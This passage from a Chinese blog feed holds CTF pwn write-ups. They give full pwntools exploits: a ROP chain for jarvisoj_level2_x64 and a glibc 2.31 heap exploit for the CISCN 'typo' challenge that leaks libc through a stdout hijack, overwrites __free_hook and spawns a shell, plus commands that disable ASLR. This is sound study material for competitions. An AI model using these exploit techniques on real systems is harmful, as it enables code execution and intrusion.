<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p>read()栈溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26824</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4004c0</span></span><br><span class="line">bin_sh = <span class="number">0x600A90</span></span><br><span class="line">rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(rdi) + p64(bin_sh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn&amp;&amp;ccb半决赛复现</title>
    <url>/2025/04/07/ciscn&amp;&amp;ccb%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><p>ubuntu20.04，glibc2.31</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目中用到的结构体：</p>
<p><img data-src="/../images/image-20250407195503012.png" alt="image-20250407195503012"></p>
<p><img data-src="/../images/image-20250407195533099.png" alt="image-20250407195533099"></p>
<p>其他函数就不看了，看一下有漏洞的函数（edit）：</p>
<p><img data-src="/../images/image-20250407195725965.png" alt="image-20250407195725965"></p>
<p>可以看到在 <code>snprintf((char *)chunklist[v1], (size_t)&quot;%lu&quot;, s, 8LL); </code>存在问题</p>
<p><code>snprintf </code>的函数原型为：<code>int snprintf(char *s, size_t maxlen, const char *format, ...)</code></p>
<p>题目将<code> (size_t)&quot;%lu&quot;</code> （即它的地址）作为了<code>maxlen</code>传入，<code>format</code> 为用户输入，于是这里同时存在格式化字符串漏洞和堆溢出漏洞</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>由于没有 show，没有什么直观的方法可以泄露 libc_base，不过见过的小伙伴一定可以第一实际想到用 _IO_2_1_stdout_ 进行泄露，在下文中，我也是这样实现的。</p>
<p>具体的利用步骤如下：</p>
<ul>
<li>利用堆溢出构造 chunk overlapping，接下来相当于可以实现double free（有的说是UAF，这里称呼为 A，B，并且 A，B 实际上为同一个 chunk）。</li>
<li>先将 A 放入 tcahebin，用堆溢出修改这个 chunk 大小，再放入 unsortedbin 中，这个时候，tcahebin 就残留了 main_arena 附近的地址。</li>
<li>再用堆溢出部分覆盖原 main_arena+96 地址为 _IO_2_1_stdout_ 附近地址，接下来就修改 _flag 为<code> 0xFBAD1800</code>， 将_IO_write_base 的地址末尾改为 00，即可泄露 libc。</li>
<li>有了 libc_base，后面就简单了，这里我改 __free_hook 为 system，接下来 getshell。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-07 20:46:31</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, ) </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p,gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set debug-file-directory ./.debug/ </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&quot;New size of content: &quot;</span>,size)</span><br><span class="line">    sa(<span class="string">b&quot;What do you want to say: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(menu,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">##本地调试可以先 echo 0 &gt; /proc/sys/kernel/randomize_va_space 禁用 ASLR</span></span><br><span class="line"><span class="comment"># 或者 sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line"><span class="comment"># 没有show, 基本是要想办法泄露libc, 有了堆溢出, 因此可以利用 overlapping</span></span><br><span class="line"><span class="comment"># 然后结合 unsortedbin 来爆破 _IO_2_1_stdout_ 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># 3. 将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># # 于是，有了：0x60 [  1]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 (main_arena+96)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">166</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xFBAD1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x25 bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tld-2.31.so  libc-2.31.so  pwn\n&#x27;</span></span><br><span class="line">exp.py    ld-2.31.so  libc-2.31.so  pwn</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h2 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h2><p><strong>exp思路理解分析：</strong></p>
<ol>
<li>这道题没有show()函数就不能像正常那样泄露地址，所以我们要劫持stdout</li>
<li>劫持stdout也需要libc地址，那么我们就需要将libc地址想办法布置到tcachebins中的next指针（或者其它）</li>
<li>存在堆溢出，可以通过overlapping来制造doubel free(同一个chunk即在tcache中，又在unsortedbin中)，从而实现申请一个堆块在stdout附近</li>
<li>最后，通过one_gadget等方式来getshell</li>
</ol>
<h3 id="unlink-合并到-top-chunk"><a href="#unlink-合并到-top-chunk" class="headerlink" title="unlink 合并到 top chunk"></a>unlink 合并到 top chunk</h3><p>unlink 合并到 top chunk(overlapping)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们的目标是让chunk 9实现double free</p>
<p>这里通过堆溢出制造overlapping_chunk9将chunk8 - 10都放入top chunk中</p>
<h3 id="构造同一个-chunk-的-UAF"><a href="#构造同一个-chunk-的-UAF" class="headerlink" title="构造同一个 chunk 的 UAF"></a>构造同一个 chunk 的 UAF</h3><p>构造同一个 chunk 的 UAF(两大小不同的堆块控制)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>

<p>这里就是再将top chunk中的chunk 9再次申请出来，我们通过一给chunk就控制了chunklist中两个chunk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555554000+0x4060</span><br><span class="line">0x555555558060: 0x000055555555b8a0      0x000055555555b7a0</span><br><span class="line">0x555555558070: 0x000055555555b6a0      0x000055555555b5a0</span><br><span class="line">0x555555558080: 0x000055555555b4a0      0x000055555555b3a0</span><br><span class="line">0x555555558090: 0x000055555555b2a0      0x000055555555b9a0</span><br><span class="line">0x5555555580a0: 0x000055555555ba70      0x000055555555bad0</span><br><span class="line"><span class="comment">#               chunk 10                 chunk 9   </span></span><br><span class="line">0x5555555580b0: 0x000055555555bad0      0x000055555555bbd0</span><br><span class="line">0x5555555580c0: 0x000055555555b9d0      0x0000000000000000</span><br><span class="line">0x5555555580d0: 0x0000000000000000      0x0000000000000000                                               </span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)<span class="comment">#这个是为了让tcachebins中0x60处next指针有效（即有两个以上的chunk）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接进行delete(9)和delete(10)一样也会被检测出来double free；</p>
<p>所以可以通过修改chunk 9和chunk 10的大小，再进行free，是他们一个进入tcachebins中，一个进入unsortedbins中。</p>
<p>这也就实现了我们的目的，在tcahebins中的那个chunk的next指针上留下了libc地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x60 [  2]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 —▸ 0x55555555bd40 ◂— ...</span><br><span class="line">0x100 [  7]: 0x55555555b2a0 —▸ 0x55555555b3a0 —▸ 0x55555555b4a0 —▸ 0x55555555b5a0 —▸ 0x55555555b6a0 —▸ 0x55555555b7a0 —▸ 0x55555555b8a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555bac0 —▸ 0x7ffff7fc1be0 ◂— 0x55555555bac0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="hijack-stdout"><a href="#hijack-stdout" class="headerlink" title="hijack stdout"></a>hijack stdout</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xfbad1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里为什么是0xa5？</p>
<p>这里的0xa5恰好可以将下面的chunk8的old_chunk_size覆盖为一个不大不小的数 0x0000006161616161 太大了会出问题(如果全覆盖的话read好像字节数太多了读取不了)</p>
<p>会导致这里的\x90\x26无法写入</p>
<p>需要把chunk8的人工size填充为一个大小合理的值，否则太大了read读取不了，太小了又不够覆盖</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>篡改了chunk 8的old_chunk_size，是他可以直接写入大量数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这个是改了chunk 9的next指针低位，使它概率指向 stdout - 0x10 的地方</p>
<p>申请出 stdout - 0x10 的地方，改 stdout 的<code>_flag</code>为 0xfbad1800，和 write_base_ptr 的低位为 00，实现泄露出libc地址</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span>+p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + p64(system_addr), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>用上前面申请的0x40的3个 chunk 改 free_hook 为 one_gadget 或改 free_hook 为 system_addr 来 get shell</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink还可以这样用，有点类似house of botcake…</p>
<h1 id="prompt"><a href="#prompt" class="headerlink" title="prompt"></a>prompt</h1><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
<li><a href="https://blog.csdn.net/a19106051385/article/details/146318753">https://blog.csdn.net/a19106051385/article/details/146318753</a></li>
<li><a href="https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw">https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw">https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw</a></li>
<li><a href="https://blog.csdn.net/XiDPPython/article/details/146384414">https://blog.csdn.net/XiDPPython/article/details/146384414</a></li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/21/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
